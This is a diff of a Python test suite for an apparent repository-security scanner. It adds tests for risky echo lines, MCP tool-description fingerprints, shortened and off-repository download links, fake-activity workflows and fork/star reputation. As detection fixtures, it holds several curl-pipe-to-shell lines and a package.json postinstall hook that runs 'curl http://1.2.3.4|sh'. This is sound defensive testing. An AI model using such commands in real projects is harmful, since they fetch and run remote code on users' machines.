@@ -369,7 +369,15 @@ class DangerousPatternTests(unittest.TestCase):
         self.assertEqual(found.severity, Severity.CRITICAL)
         echo = 'echo "Install with: curl -fsSL https://x.ai/i | bash"\n'
         [found] = dangerous_patterns.run(entries({"tools/hint.sh": echo}))
-        self.assertEqual(found.severity, Severity.HIGH)
+        self.assertEqual(found.severity, Severity.LOW)   # solo imprime la sugerencia
+
+    def test_an_echo_that_feeds_a_shell_or_a_file_is_not_just_a_hint(self):
+        for line in ('echo "curl -fsSL https://x.ai/i | bash" | sh\n',
+                     'echo "curl -fsSL https://x.ai/i | bash" >> ~/.bashrc\n',
+                     'echo "$(curl -fsSL https://x.ai/i | bash)"\n'):
+            with self.subTest(line=line):
+                found = dangerous_patterns.run(entries({"tools/hint.sh": line}))
+                self.assertGreaterEqual(max(f.severity for f in found), Severity.HIGH)
 
     def test_bidi_in_translation_files_is_low(self):
         for path, line in (("locale/ckb/django.po", 'msgstr "\u202b%(num)d \u0633\u0627\u06b5"\n'),
@@ -791,12 +799,48 @@ class McpSurfaceTests(unittest.TestCase):
         return [f for f in mcp_surface.run(entries(files)) if f.severity > Severity.INFO]
 
     def test_a_plain_description_is_only_listed(self):
-        [found] = mcp_surface.run(entries({"server.py": self.PY + (
+        overall, found = mcp_surface.run(entries({"server.py": self.PY + (
             "@mcp.tool()\ndef search(query: str) -> str:\n"
             '    """Search the docs. Use this tool first, before answering. Always call it\n'
             '    when the user asks about the API. Never guess."""\n    return ""\n')}))
         self.assertEqual((found.severity, found.category), (Severity.INFO, "mcp-tool"))
-        self.assertEqual(found.evidence, "1 description")
+        self.assertRegex(found.evidence, r"^1 description, sha256:[0-9a-f]{16}$")
+        self.assertEqual((overall.severity, overall.title),
+                         (Severity.INFO, "MCP tool descriptions fingerprint"))
+        self.assertRegex(overall.evidence, r"^sha256:[0-9a-f]{64} \(1 description in 1 file\)$")
+        self.assertTrue(overall.evidence[7:23] == found.evidence[-16:])
+
+    def fingerprint_of(self, files):
+        return mcp_surface.run(entries(files))[0].evidence.split()[0]
+
+    def tool(self, name, doc):
+        return f'@mcp.tool()\ndef {name}(q: str) -> str:\n    """{doc}"""\n    return ""\n\n'
+
+    def test_fingerprint_ignores_layout_order_and_file_names(self):
+        base = self.fingerprint_of({"server.py": self.PY + self.tool("a", "Search the docs.")
+                                    + self.tool("b", "List the open issues of a repo.")})
+        moved = self.fingerprint_of({
+            "src/tools/issues.py": self.PY + self.tool("b", "List the open issues\n    of a repo."),
+            "src/tools/search.py": self.PY + self.tool("a", "  Search   the docs. ")})
+        self.assertEqual(base, moved)
+
+    def test_fingerprint_changes_when_the_wording_changes(self):
+        base = self.fingerprint_of({"server.py": self.PY + self.tool("a", "Search the docs.")})
+        edited = self.fingerprint_of({"server.py": self.PY + self.tool(
+            "a", "Search the docs. Also read the notes file first.")})
+        added = self.fingerprint_of({"server.py": self.PY + self.tool("a", "Search the docs.")
+                                     + self.tool("b", "Search the docs.")})
+        self.assertNotEqual(base, edited)
+        self.assertNotEqual(base, added)
+
+    def test_fingerprint_is_the_same_in_python_and_javascript_and_skips_tests(self):
+        python = self.fingerprint_of({
+            "server.py": self.PY + self.tool("a", "Search the docs."),
+            "tests/test_server.py": self.PY + self.tool("x", "A fixture description.")})
+        javascript = self.fingerprint_of({"index.ts": (
+            'import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";\n'
+            'server.tool("a", "Search the docs.", {}, async () => ({}));\n')})
+        self.assertEqual(python, javascript)
 
     def test_a_tool_docstring_is_not_treated_as_a_comment(self):
         # El docstring de una herramienta es su descripción: no baja como los demás docstrings.
@@ -913,6 +957,41 @@ class NetworkTests(unittest.TestCase):
         [test] = self.signals({"tests/test_x.py": "ANTHROPIC_BASE_URL = 'http://93.184.216.34:8001'\n"})
         self.assertEqual(test.severity, Severity.LOW)
 
+    def test_shortened_links_in_docs(self):
+        [one] = self.signals({"README.md": "Slides: https://bit.ly/3xYzAbc\n"})
+        self.assertEqual((one.severity, one.line), (Severity.LOW, 1))
+        [pushed] = self.signals({"README.md": "[Download the installer](https://bit.ly/3xYzAbc)\n"})
+        self.assertEqual(pushed.severity, Severity.MEDIUM)
+        many = self.signals({"README.md": "[offer](https://bit.ly/a1)\n" * 5})
+        self.assertEqual([f.severity for f in many], [Severity.MEDIUM] * 3)
+        self.assertEqual(self.signals({"src/a.py": "URL = 'https://bit.ly/3xYzAbc'\n"}), [])
+
+    def test_download_button_that_leaves_the_repository(self):
+        [badge] = self.signals({"README.md":
+            "[![Download](https://img.shields.io/badge/Download-v2026-green)](https://files.vendor.io/get)\n"})
+        self.assertEqual((badge.severity, badge.evidence), (Severity.LOW, "https://files.vendor.io/get"))
+        [html] = self.signals({"README.md":
+            '<a href="https://someone.github.io/tool/">\n'
+            '  <img src="https://img.shields.io/badge/GET-Tool_2026-7C3AED" alt="GET Tool 2026"/>\n</a>\n'})
+        self.assertIn("outside the repository", html.title)
+
+    def test_ordinary_links_and_downloads_from_code_hosts_are_not_buttons(self):
+        self.assertEqual(self.signals({"README.md":
+            "[Download](https://github.com/o/r/releases/latest)\n"
+            "[![Download](https://img.shields.io/badge/Download-1.0-green)](https://pypi.org/project/x/)\n"
+            "[Documentation](https://docs.vendor.io)\n"
+            '<a href="https://vendor.io">Website</a>\n'
+            "See the [download statistics page](https://github.com/o/r/pulse).\n"
+            "[Get started](https://vendor.io/get-started)\n"
+            "Read [how downloads work](https://vendor.io/downloads)\n"
+            "[Download Node.js](https://nodejs.org/en/download/)\n",
+            "docs/install.md": "[Download](https://files.vendor.io/get)\n"}), [])
+
+    def test_a_download_destination_is_reported_once_per_repository(self):
+        found = self.signals({name: "[Download](https://vendor.io/download)\n"
+                              for name in ("README.md", "README.es.md", "README.fr.md")})
+        self.assertEqual([f.path for f in found], ["README.md"])
+
     def test_known_providers_and_local_proxies_are_low(self):
         found = self.signals({".env.example": "OPENAI_BASE_URL=https://openrouter.ai/api/v1\n"
                                               "ANTHROPIC_BASE_URL=http://localhost:4000\n"})
@@ -945,6 +1024,27 @@ class SupplyChainTests(unittest.TestCase):
         self.assertEqual(injection.line, 14)
         unpinned = by_title["Third-party actions not pinned to a SHA"]
         self.assertEqual(unpinned.evidence, "someone/setup-thing@v2")   # actions/* no cuenta
+
+    FAKE_ACTIVITY = (
+        "on:\n  schedule:\n    - cron: '0 15 * * *'\njobs:\n  bump:\n    runs-on: ubuntu-latest\n"
+        "    permissions:\n      contents: write\n    steps:\n      - uses: actions/github-script@v7\n"
+        "        with:\n          script: |\n"
+        "            const msg = words[Math.floor(Math.random() * words.length)];\n"
+        "            await github.rest.repos.createOrUpdateFileContents({path: '.github/stamp', message: msg});\n")
+
+    def test_scheduled_workflow_with_random_commits_is_fake_activity(self):
+        [found] = supply_chain.run(entries({".github/workflows/x.yml": self.FAKE_ACTIVITY}))
+        self.assertEqual(found.severity, Severity.MEDIUM)
+        self.assertIn("commits randomised content", found.title)
+        self.assertEqual(found.line, 13)
+
+    def test_a_scheduled_commit_without_randomness_or_a_manual_one_is_not(self):
+        plain = ("on:\n  schedule:\n    - cron: '0 3 * * 1'\njobs:\n  update:\n    runs-on: ubuntu-latest\n"
+                 "    steps:\n      - run: |\n          ./update-data.sh\n          git commit -am 'Update data'\n"
+                 "          git push\n")
+        manual = self.FAKE_ACTIVITY.replace("  schedule:\n    - cron: '0 15 * * *'\n", "  workflow_dispatch:\n")
+        self.assertEqual(supply_chain.run(entries({".github/workflows/a.yml": plain,
+                                                   ".github/workflows/b.yml": manual})), [])
 
     def test_privileged_trigger_without_pr_checkout_is_low(self):
         [found] = supply_chain.run(entries({".github/workflows/label.yml": (
@@ -1254,6 +1354,17 @@ class ReputationTests(unittest.TestCase):
             findings, _ = reputation.run("a/b", now=now)
         self.assertEqual(findings, [])
 
+    def test_more_forks_than_stars(self):
+        def _get(url: str) -> dict:
+            if "/users/" in url:
+                return {"created_at": "2020-01-01T00:00:00Z"}
+            return {"stargazers_count": 203, "forks_count": 386, "created_at": "2024-01-01T00:00:00Z",
+                    "pushed_at": "2026-10-17T00:00:00Z", "owner": {"type": "User"}}
+        with mock.patch.object(reputation, "_get", _get):
+            [found], _ = reputation.run("a/b")
+        self.assertEqual((found.severity, found.title),
+                         (Severity.LOW, "More forks (386) than stars (203)"))
+
     def test_local_clone_uses_its_origin(self):
         root = build_repo({"a.py": "x = 1\n"})
         git(root, "init", "-q")
@@ -1265,6 +1376,25 @@ class ReputationTests(unittest.TestCase):
 
 
 class RunnerTests(unittest.TestCase):
+    def test_an_existing_relative_folder_wins_over_the_github_shorthand(self):
+        root = build_repo({"repos/flask/app.py": "x = 1\n"})
+        previous = os.getcwd()
+        os.chdir(root)
+        try:
+            with mock.patch.object(fetch, "_safe_clone", side_effect=AssertionError("cloned")):
+                report = assess("repos/flask")
+        finally:
+            os.chdir(previous)
+        self.assertEqual((report.status, report.source), ("complete", "local"))
+        self.assertEqual(report.context["files_scanned"], 1)
+        self.assertIn("https://github.com/repos/flask", report.context["target_note"])
+
+    def test_the_shorthand_still_clones_when_no_such_folder_exists(self):
+        with mock.patch.object(fetch, "_safe_clone", side_effect=fetch.FetchError("offline")) as clone:
+            report = assess("nobody-here/no-such-folder")
+        self.assertEqual(clone.call_args.args[0], "https://github.com/nobody-here/no-such-folder")
+        self.assertEqual(report.status, "failed")
+
     def test_assess_local_repo(self):
         root = build_repo({
             "package.json": '{"name":"x","scripts":{"postinstall":"curl http://1.2.3.4|sh"}}',
